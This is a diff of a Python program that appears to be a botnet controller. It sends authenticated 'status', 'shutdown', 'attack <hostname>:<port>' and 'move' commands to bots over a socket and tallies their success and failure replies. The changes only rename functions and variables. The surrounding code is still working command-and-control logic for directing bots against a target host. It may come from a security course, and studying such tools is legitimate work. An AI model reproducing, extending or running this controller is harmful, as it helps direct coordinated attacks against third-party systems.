@@ -7,16 +7,16 @@ import hashlib
 import select
 import random
 
-def compute_mac(nonce, secret):
+def computeMac(nonce, secret):
     combo = nonce + secret
     sha_val = hashlib.sha256(combo.encode('utf-8')).hexdigest()
     return sha_val[:8]
 
-def generate_nonce():
+def nonceGen():
     """Generate a random numeric nonce. Could also be a random integer or string."""
     return str(random.randint(100000, 999999))
 
-def collect_responses(sock, timeout=5):
+def get_response(sock, timeout=5):
     """
     Collect lines from the server for 'timeout' seconds.
     Return them as a list of lines (strings, stripped).
@@ -58,11 +58,11 @@ def parse_status_responses(lines):
     results = []
     for line in lines:
         if line.startswith("-status "):
-            parts = line.split()
-            if len(parts) == 3:
+            tokens = line.split()
+            if len(tokens) == 3:
                 # e.g., ["-status", "<nick>", "<count>"]
-                nick = parts[1]
-                count = parts[2]
+                nick = tokens[1]
+                count = tokens[2]
                 results.append((nick, count))
     return results
 
@@ -74,9 +74,9 @@ def parse_shutdown_responses(lines):
     nicks = []
     for line in lines:
         if line.startswith("-shutdown "):
-            parts = line.split()
-            if len(parts) == 2:
-                nicks.append(parts[1])
+            tokens = line.split()
+            if len(tokens) == 2:
+                nicks.append(tokens[1])
     return nicks
 
 def parse_attack_responses(lines):
@@ -90,17 +90,17 @@ def parse_attack_responses(lines):
     failures = {}
     for line in lines:
         if line.startswith("-attack "):
-            parts = line.split(None, 3)
+            tokens = line.split(None, 3)
             # e.g. "-attack <nick> OK"
-            if len(parts) >= 3:
-                nick = parts[1]
-                result = parts[2]
+            if len(tokens) >= 3:
+                nick = tokens[1]
+                result = tokens[2]
                 if result == "OK":
                     successes[nick] = True
                 elif result == "FAIL":
-                    # parts[3] might be the reason
-                    if len(parts) == 4:
-                        failures[nick] = parts[3]
+                    # tokens[3] might be the reason
+                    if len(tokens) == 4:
+                        failures[nick] = tokens[3]
                     else:
                         failures[nick] = "unknown"
     return successes, failures
@@ -113,9 +113,9 @@ def parse_move_responses(lines):
     nicks = []
     for line in lines:
         if line.startswith("-move "):
-            parts = line.split()
-            if len(parts) == 2:
-                nicks.append(parts[1])
+            tokens = line.split()
+            if len(tokens) == 2:
+                nicks.append(tokens[1])
     return nicks
 
 def main():
@@ -154,8 +154,8 @@ def main():
         if not cmdline:
             continue
 
-        parts = cmdline.split()
-        command = parts[0].lower()
+        tokens = cmdline.split()
+        command = tokens[0].lower()
 
         if command == "quit":
             # Disconnect and exit
@@ -165,11 +165,11 @@ def main():
 
         elif command == "status":
             #authentication
-            nonce = generate_nonce() 
-            mac = compute_mac(nonce, secret)
+            nonce = nonceGen() 
+            mac = computeMac(nonce, secret)
             msg = f"{nonce} {mac} status\n"
             s.sendall(msg.encode('utf-8'))
-            lines = collect_responses(s, timeout=5)
+            lines = get_response(s, timeout=5)
             st = parse_status_responses(lines)
             if st:
                 print(f"  Waiting 5s to gather replies.")
@@ -182,11 +182,11 @@ def main():
                 print("  Result: 0 bots replied.")
 
         elif command == "shutdown":
-            nonce = generate_nonce()
-            mac = compute_mac(nonce, secret)
+            nonce = nonceGen()
+            mac = computeMac(nonce, secret)
             msg = f"{nonce} {mac} shutdown\n"
             s.sendall(msg.encode('utf-8'))
-            lines = collect_responses(s, timeout=5)
+            lines = get_response(s, timeout=5)
             nicks = parse_shutdown_responses(lines)
             if nicks:
                 print(f"  Waiting 5s to gather replies.")
@@ -197,16 +197,16 @@ def main():
 
         elif command == "attack":
             # usage: attack <hostname>:<port>
-            if len(parts) < 2:
+            if len(tokens) < 2:
                 print("Error: attack requires <hostname>:<port>")
                 continue
-            target = parts[1]
+            target = tokens[1]
             #auth
-            nonce = generate_nonce()
-            mac = compute_mac(nonce, secret)
+            nonce = nonceGen()
+            mac = computeMac(nonce, secret)
             msg = f"{nonce} {mac} attack {target}\n"
             s.sendall(msg.encode('utf-8')) # Send the attack message over the socket
-            lines = collect_responses(s, timeout=5)
+            lines = get_response(s, timeout=5)
             succ, fail = parse_attack_responses(lines) #parse for success and failure
             total_ok = len(succ)
             total_fail = len(fail)
@@ -221,15 +221,15 @@ def main():
 
         elif command == "move":
             # usage: move <hostname>:<port>
-            if len(parts) < 2:
+            if len(tokens) < 2:
                 print("Error: move requires <hostname>:<port>")
                 continue
-            new_target = parts[1]
-            nonce = generate_nonce()
-            mac = compute_mac(nonce, secret)
+            new_target = tokens[1]
+            nonce = nonceGen()
+            mac = computeMac(nonce, secret)
             msg = f"{nonce} {mac} move {new_target}\n"
             s.sendall(msg.encode('utf-8'))
-            lines = collect_responses(s, timeout=5)
+            lines = get_response(s, timeout=5)
             mvnicks = parse_move_responses(lines)
             if mvnicks:
                 print(f"  Waiting 5s to gather replies.")
